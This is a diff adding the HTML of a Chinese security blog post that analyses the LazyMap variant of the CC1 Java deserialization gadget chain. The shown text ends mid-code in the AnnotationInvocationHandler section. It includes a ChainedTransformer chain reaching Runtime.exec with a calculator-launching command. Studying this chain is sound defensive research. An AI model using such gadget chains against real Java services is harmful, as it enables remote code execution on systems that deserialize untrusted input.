@@ -1,0 +1,329 @@
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Java反序列化漏洞之LazyMap版CC1链 | _0xf4n9x_'s Blog</title><meta name="author" content="_0xf4n9x_"><meta name="copyright" content="_0xf4n9x_"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="0x00 LazyMap的由来 0x01 影响版本 0x02 动态代理 0x03 LayzMap#get 0x04 AnnotationInvocationHandler#invoke 0x05 概念验证 0x06 Debug导致的小问题 0x07 参考  0x00 LazyMap的由来在上一篇《Java反序列化漏洞之TransformedMap版CC1链》文章中，提到了2015年1月加州App">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java反序列化漏洞之LazyMap版CC1链">
+<meta property="og:url" content="https://0xf4n9x.github.io/java-deserialization-cc1-lazymap.html">
+<meta property="og:site_name" content="_0xf4n9x_&#39;s Blog">
+<meta property="og:description" content="0x00 LazyMap的由来 0x01 影响版本 0x02 动态代理 0x03 LayzMap#get 0x04 AnnotationInvocationHandler#invoke 0x05 概念验证 0x06 Debug导致的小问题 0x07 参考  0x00 LazyMap的由来在上一篇《Java反序列化漏洞之TransformedMap版CC1链》文章中，提到了2015年1月加州App">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://0xf4n9x.github.io/img/post/java-deserialization-cc1-lazymap/1.png">
+<meta property="article:published_time" content="2023-01-04T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-03-11T16:00:00.000Z">
+<meta property="article:author" content="_0xf4n9x_">
+<meta property="article:tag" content="java">
+<meta property="article:tag" content="deserialization">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://0xf4n9x.github.io/img/post/java-deserialization-cc1-lazymap/1.png"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://0xf4n9x.github.io/java-deserialization-cc1-lazymap.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//static.cloudflareinsights.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-YRH7DCY1TL"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-YRH7DCY1TL');
+</script><script defer="defer" data-pjax="data-pjax" src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon="{&quot;token&quot;: &quot;3f9a5286f0c84213b902626e6f7a5081&quot;}"></script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: false,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Java反序列化漏洞之LazyMap版CC1链',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-03-12 00:00:00'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const now = new Date()
+          const hour = now.getHours()
+          const isNight = hour <= 6 || hour >= 18
+          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+          else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="_0xf4n9x_'s Blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">24</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/post/java-deserialization-cc1-lazymap/1.png')"><nav id="nav"><span id="blog-info"><a href="/" title="_0xf4n9x_'s Blog"><span class="site-name">_0xf4n9x_'s Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Java反序列化漏洞之LazyMap版CC1链</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-01-04T16:00:00.000Z" title="Created 2023-01-05 00:00:00">2023-01-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-03-11T16:00:00.000Z" title="Updated 2023-03-12 00:00:00">2023-03-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">2.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>10min</span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">Comments:</span><a href="/java-deserialization-cc1-lazymap.html#post-comment"><span class="gitalk-comment-count"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><ul>
+<li><a href="#0x00-LazyMap%E7%9A%84%E7%94%B1%E6%9D%A5">0x00 LazyMap的由来</a></li>
+<li><a href="#0x01-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC">0x01 影响版本</a></li>
+<li><a href="#0x02-%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86">0x02 动态代理</a></li>
+<li><a href="#0x03-LayzMap-get">0x03 LayzMap#get</a></li>
+<li><a href="#0x04-AnnotationInvocationHandler-invoke">0x04 AnnotationInvocationHandler#invoke</a></li>
+<li><a href="#0x05-%E6%A6%82%E5%BF%B5%E9%AA%8C%E8%AF%81">0x05 概念验证</a></li>
+<li><a href="#0x06-Debug%E5%AF%BC%E8%87%B4%E7%9A%84%E5%B0%8F%E9%97%AE%E9%A2%98">0x06 Debug导致的小问题</a></li>
+<li><a href="#0x07-%E5%8F%82%E8%80%83">0x07 参考</a></li>
+</ul>
+<h2 id="0x00-LazyMap的由来"><a href="#0x00-LazyMap的由来" class="headerlink" title="0x00 LazyMap的由来"></a>0x00 LazyMap的由来</h2><p>在上一篇<a href="./java-deserialization-cc1-transformedmap">《Java反序列化漏洞之TransformedMap版CC1链》</a>文章中，提到了2015年1月加州AppSec安全会议上，Chris Frohoff和Gabe Lawrence在演讲中就CommonsCollections1完整调用链做出了演示，其中所用到的中间Gadget链就是<code>LazyMap</code>类，在随后发布的Ysoserial工具中所包含的CommonsCollections1链也同样如此。</p>
+<p>那么，本文将会详细分析<code>LazyMap</code>作为中间链的这种反序列化利用方式。当然，与<code>TransformedMap</code>作为中间Gadget链相比，kick-off入口类与sink危害类都是相同的类，所以涉及重复的内容不会再赘述。不过，虽然sink类相同，但其中执行的方法却有所不同。</p>
+<p>在此之前还需要了解一些前置知识，比如Java动态代理机制，当对LazyMap作为中间链的反序列化利用方式分析透彻了，对于后面学习其他Gadget链也是有帮助的，比如CommonsCollections3、CommonsCollections5、CommonsCollections6、CommonsCollections7都有涉及到<code>LazyMap</code>类。</p>
+<h2 id="0x01-影响范围"><a href="#0x01-影响范围" class="headerlink" title="0x01 影响范围"></a>0x01 影响范围</h2><p>与上一篇文章中提到的影响范围相同，都是影响JDK 8u71以下的版本，且Commons Collections的版本要求在3.0以上、3.2.2以下。</p>
+<h2 id="0x02-动态代理"><a href="#0x02-动态代理" class="headerlink" title="0x02 动态代理"></a>0x02 动态代理</h2><p>Java中的动态代理是一种在运行时创建代理对象的机制，该代理对象能够拦截对目标对象方法的调用并在调用前后执行额外的逻辑，动态代理通常用于在不修改原始代码的情况下实现日志记录、性能监控、事务管理等功能。</p>
+<p>动态代理主要使用<code>java.lang.reflect.Proxy</code>类和<code>java.lang.reflect.InvocationHandler</code>接口来实现，<code>Proxy</code>类用于创建代理对象，而<code>InvocationHandler</code>接口则负责处理代理对象方法的调用。如下示例代码，非常清晰地演示了不使用动态代理与使用动态代理之间的差异性，一言以蔽之，被动态代理的对象每执行一个方法，都会调用对应的实现<code>InvocationHandler</code>接口类的<code>invoke</code>方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">InvocationHandlerDemo</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> Object obj;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InvocationHandlerDemo</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.obj = obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span> (method.getName().compareTo(<span class="string">&quot;get&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;invoke is called.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.obj, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">      </span><br><span class="line">        map.put(<span class="string">&quot;k&quot;</span>, <span class="string">&quot;v&quot;</span>);</span><br><span class="line">        <span class="comment">// 正常通过键获取值的方式</span></span><br><span class="line">        System.out.println(<span class="string">&quot;k: &quot;</span> + map.get(<span class="string">&quot;k&quot;</span>));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;--------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过代理的方式</span></span><br><span class="line">        <span class="comment">// 首先先创建InvocationHandler实例</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvocationHandlerDemo</span>(map);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 再创建代理实例对象</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">                Map.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,</span><br><span class="line">                invocationHandler</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">// 最后通过代理对象执行相关操作</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> (String) proxyMap.get(<span class="string">&quot;k&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;k: &quot;</span> + result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 执行结果：</span></span><br><span class="line"><span class="comment">k: v</span></span><br><span class="line"><span class="comment">--------------------------</span></span><br><span class="line"><span class="comment">invoke is called.</span></span><br><span class="line"><span class="comment">k: v</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-LayzMap-get"><a href="#0x03-LayzMap-get" class="headerlink" title="0x03 LayzMap#get"></a>0x03 LayzMap#get</h2><p><code>org.apache.commons.collections.map.LazyMap</code>是一个继承自AbstractMapDecorator并用于创建懒加载的装饰类，它实现了<code>Map</code>和<code>Serializable</code>，其中的<code>decorate</code>方法用于创建一个装饰后的<code>Map</code>实例，该方法接受一个被装饰的<code>Map</code>对象，以及一个工厂对象，后者将作为Lazymap的<code>factory</code>成员变量。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMap</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapDecorator</span> <span class="keyword">implements</span> <span class="title class_">Map</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">7990956402564206740L</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Factory factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.factory = FactoryTransformer.getInstance(factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.factory = factory;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// 如果key当前不在map中，则为key创建value</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>LayzMap#get</code>方法中，先会对传入的key进行判断是否存在于<code>map</code>中，此处的<code>map</code>是父类<code>AbstractMapDecorator</code>中的成员变量，且用到了<code>transient</code>修饰符，意味着它不会参与序列化，也意味着在反序列化过程中<code>map</code>会为空，其中不会包含任何key，这样就会顺利进入到if代码块中，而在其中有对<code>factory</code>的<code>transform</code>方法进行调用。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractMapDecorator</span> <span class="keyword">implements</span> <span class="title class_">Map</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The map to decorate */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">transient</span> Map map;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那么，当通过<code>LazyMap.decorate</code>方法传入一个恶意的<code>ChainedTransformer</code>对象作为恶意的<code>factory</code>，然后再调用<code>LayzMap#get</code>方法，最终就会触发恶意行为。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.cc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LazyMapTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Transformer[] ts = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">tc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(ts);</span><br><span class="line"></span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), tc);</span><br><span class="line"></span><br><span class="line">        lazyMap.get(<span class="string">&quot;xx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/post/java-deserialization-cc1-lazymap/containskey.png"></p>
+<p><img src="/img/post/java-deserialization-cc1-lazymap/0.png"></p>
+<h2 id="0x04-AnnotationInvocationHandler-invoke"><a href="#0x04-AnnotationInvocationHandler-invoke" class="headerlink" title="0x04 AnnotationInvocationHandler#invoke"></a>0x04 AnnotationInvocationHandler#invoke</h2><p><code>AnnotationInvocationHandler</code>类实现了<code>InvocationHandler</code>，这恰恰让人联系到上面的动态代理机制，而且这个类中的<code>invoke</code>方法里存在<code>memberValues.get</code>方法的调用，这又能够关联到<code>LayzMap#get</code>方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span 